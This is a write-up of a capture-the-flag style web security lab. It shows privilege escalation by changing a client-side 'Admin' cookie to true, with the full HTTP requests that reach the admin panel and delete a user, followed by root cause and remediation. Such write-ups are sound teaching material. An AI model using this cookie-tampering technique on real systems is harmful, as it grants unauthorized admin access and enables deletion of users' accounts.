# User role controlled by request parameter

**Category:** Broken Access Control  
**Difficulty:** ⭐ (Apprentice)  
**Severity:** 🟠 High  
**OWASP Top 10:** A01:2021 – Broken Access Control

---

## Description

The application determines a user's administrative privileges based on a client-controllable cookie parameter (`Admin`). An authenticated low-privilege user can escalate their role to administrator simply by flipping the `Admin` cookie value from `false` to `true`, bypassing all server-side authorization checks and gaining unrestricted access to the admin panel.

---

## Discovery Process

**Step 1 — Login as a standard user**

A login request was submitted using the provided standard user credentials (`wiener`). Authentication succeeded and a session cookie was issued.

> 📸 `screenshots/01-login.png`

**Step 2 — Accessing the admin panel with default privileges**

While authenticated as the standard user, a direct request to `GET /admin` was issued. The server responded with **HTTP/2 401 Unauthorized**, and the request included a cookie with `Admin=false`. This confirmed that the application explicitly tracks the admin role in a client-side cookie.

> 📸 `screenshots/02-admin-401.png`

---

## Exploitation

**Step 3 — Privilege escalation via cookie manipulation**

The `Admin` cookie was modified from `false` to `true` in Burp Suite Repeater, while keeping the same valid `session` token. The request was resent to `GET /admin`. The server responded with **HTTP/2 200 OK**, rendering the full admin interface. No server-side verification of the user's actual role was performed.

**Request sent:**

```http
GET /admin HTTP/2
Host: 0a30004a04950f79801d85ab00d800c1.web-security-academy.net
Cookie: Admin=true; session=pD3ylQ65MHmerfecqouX5lX3tXCuvAAV
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

**Response received:**

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3219
```

> 📸 `screenshots/03-admin-access.png`

**Step 4 — Performing an administrative action**

With elevated privileges confirmed, the admin delete functionality was invoked by sending a request to `GET /admin/delete?username=carlos`. The server processed the action and returned **HTTP/2 302 Found**, redirecting back to `/admin`, confirming that the user `carlos` was successfully deleted.

**Request sent:**

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a04950f79801d85ab00d800c1.web-security-academy.net
Cookie: Admin=true; session=pD3ylQ65MHmerfecqouX5lX3tXCuvAAV
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a30004a04950f79801d85ab00d800c1.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

**Response received:**

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

> 📸 `screenshots/04-delete-302.png`

**Step 5 — Lab solved**

The successful deletion of the user `carlos` triggered the lab completion condition. The page displayed the "Congratulations, you solved the lab!" banner.

> 📸 `screenshots/05-lab-solved.png`

---

## Impact

- **Privilege Escalation** — Any authenticated user can self-promote to administrator without credentials or server validation, gaining full control over the application.
- **Unauthorized Data Manipulation** — With admin access, an attacker can delete users, modify configurations, and access sensitive administrative data.
- **Complete Account Compromise** — The vulnerability enables mass account deletion or modification, effectively allowing an attacker to take down the application's user base.

---

## Root Cause

The application stores the user's role (`Admin`) in a client-side cookie and trusts this value during authorization decisions. The server fails to independently verify the user's privileges against the backend database or session store before granting access to restricted endpoints.

**Vulnerable flow:**

```
Attacker logs in as standard user → Server sets Admin=false cookie → Attacker changes Admin=true → Server reads cookie → ❌ Grants admin access without backend verification
```

**Secure flow:**

```
Attacker logs in as standard user → Server sets session token only → Attacker changes any client value → Server queries backend for user's role → ✅ Denies access because backend confirms standard user privileges
```

---

## Remediation

- **Server-Side Role Enforcement** — Never trust client-provided values (cookies, headers, parameters) for authorization decisions. Always query the user's role from a server-side session store or database.
- **Remove Role from Client Cookies** — Store only an opaque, unpredictable session identifier in the cookie. Map that identifier server-side to the user's privileges.
- **Implement Authorization Middleware** — Enforce role-based access control (RBAC) checks on every sensitive endpoint using a centralized, server-side authorization layer that is independent of client input.

---

## Tools Used

- Burp Suite (Proxy & Repeater)
- Web browser

---

## References

- [PortSwigger – User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
- [OWASP – Testing for Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
